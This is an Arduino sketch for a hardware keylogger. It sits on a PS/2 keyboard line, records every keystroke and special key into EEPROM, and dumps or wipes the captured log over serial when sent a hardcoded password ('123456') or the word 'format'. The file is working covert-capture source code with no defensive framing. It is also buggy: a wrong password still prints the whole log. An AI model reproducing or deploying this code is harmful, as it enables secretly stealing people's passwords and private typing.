 
 
 // SAHER BLUE EAGLE

#include <EEPROM.h>

#include <SPI.h>

#include <PS2Keyboard.h> // https://playground.arduino.cc/Main/PS2Keyboard
#include <SD.h>
const int DataPin = 3; //data green in my ps2 keyboard 

const int IRQpin =  2;   //clk gray in my ps2 keyboard
String pass,format;
String incoming = ""; 
int isdone = 0;
int isWROTE = 0;
int iscapson = 0;
String Logxx = "LOG : ";
//const int chipSele myFile; 
int i = 0;
int  j = 0 ;
PS2Keyboard keyboard;

void setup()
{
  Serial.begin(9600);
      pass =  String("123456");
      format = String("format");
        for (int x = 0 ; x < EEPROM.length() ; x++){
               if ( EEPROM.read(x)==0){//-1
                i = x;
                break;
               }
                 if ( EEPROM.read(x) =='0'){//-1
                i = x;
                break;
               }
               }
  keyboard.begin(DataPin, IRQpin);                                                
}

void loop()
{         incoming = "";

          if (Serial.available() > 0) {
                incoming = Serial.readString();
                Serial.print("Password");
                  Serial.println();

  if(format == incoming){
               Serial.println(incoming);
               Logxx = "Formatted : ";
         for (int x = 0 ; x < EEPROM.length() ; x++){
               char cc =  EEPROM.read(x);
               EEPROM.update(x, '0');//-1
               Logxx += cc;
               isdone = 1;
               }
      Serial.print("Format Done");
      Serial.println();
       Serial.print(Logxx);
      }else if(pass == incoming ){
            for (int x = 0 ; x < EEPROM.length() ; x++){
               char cc =  EEPROM.read(x);
              
               Logxx += cc;
               isdone = 1;
               }

                  
                   if (isdone > 0){
                 if (isWROTE > 0){
    
                  }else{
                          Serial.println();
                    Serial.print(Logxx);
                          Serial.println();
                    isWROTE = 1;
                 }
  
                   }
      }else{
          Serial.print("Wrong Password");
    for (int x = 0 ; x < EEPROM.length() ; x++){
               char cc =  EEPROM.read(x);
              
               Logxx += cc;
             
               }
                    Serial.println();
                    Serial.print(Logxx);
                          Serial.println();
      }
      
 


            
          
                   
           }
 if(keyboard.available())
  {
    char c = keyboard.read();
   // uint8_t  dat =  keyboard.readbte();

switch (c) {
  case PS2_ENTER:
    if (i < EEPROM.length()){
    
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'E');
             i++;
              EEPROM.update(i, 'N');
               i++;
                EEPROM.update(i, 'T');
                 i++;
                  EEPROM.update(i, 'R');
                   i++;
                    EEPROM.update(i, ']');
                     i++;
     
        }
    break;
  case PS2_BACKSPACE | PS2_DELETE:
 

            if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'B');
             i++;
              EEPROM.update(i, 'A');
               i++;
                EEPROM.update(i, 'C');
                 i++;
                  EEPROM.update(i, 'K');
                 i++;
                    EEPROM.update(i, 'S');
                 i++;
                    EEPROM.update(i, 'P');
                 i++;
                    EEPROM.update(i, 'A');
                 i++;
                    EEPROM.update(i, 'C');
                 i++;
                    EEPROM.update(i, 'E');
                 i++;
                    EEPROM.update(i, ']');
                     i++;
     
        } 
    break;
    case PS2_TAB:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'T');
             i++;
              EEPROM.update(i, 'A');
               i++;
                EEPROM.update(i, 'B');
                 i++;
                    EEPROM.update(i, ']');
                     i++;
       
        } 
        break;

case PS2_UPARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'U');
             i++;
              EEPROM.update(i, 'P');
               i++;
                    EEPROM.update(i, ']');
                     i++;
       
        } 
        break;
 case PS2_DOWNARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'D');
             i++;
              EEPROM.update(i, 'W');
               i++;
                    EEPROM.update(i, 'N');
                     i++;
                      EEPROM.update(i, ']');
                     i++;
       
        } 
  break;
   case PS2_RIGHTARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'R');
             i++;
              EEPROM.update(i, 'G');
               i++;
                    EEPROM.update(i, 'H');
                     i++;
                      EEPROM.update(i, 'T');
                     i++;

          EEPROM.update(i, ']');
                     i++;
       
        } 
  break;
 case PS2_LEFTARROW:
     if (i < EEPROM.length()){
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'L');
             i++;
              EEPROM.update(i, 'E');
               i++;
                    EEPROM.update(i, 'F');
                     i++;
                      EEPROM.update(i, 'T');
                     i++;

          EEPROM.update(i, ']');
                     i++;
       
        } 
  break;
  /*case PS2_CAPSLOCK:// to enable this to detect capslock press , you have to modify it manually in PS/2  Library ;) ;)
       if (i < EEPROM.length()){
      
          EEPROM.update(i, '[');
           i++;
            EEPROM.update(i, 'C');
             i++;
              EEPROM.update(i, 'A');
               i++;
                    EEPROM.update(i, 'P');
                     i++;

          EEPROM.update(i, ']');
                     i++;

                     
       
       
          
       
        }
  break;*/
  default:
   
     if (i < EEPROM.length()){
    EEPROM.update(i, c);
    i++;
    } 
    
}
}
  
  
   // while(!(myFile = SD.open("new.txt", FILE_WRITE))); 
  //  myFile.print(c);
  //  myFile.close();
    
  }  
 
    // SAHER BLUE EAGLE
 // SAHER BLUE EAGLE
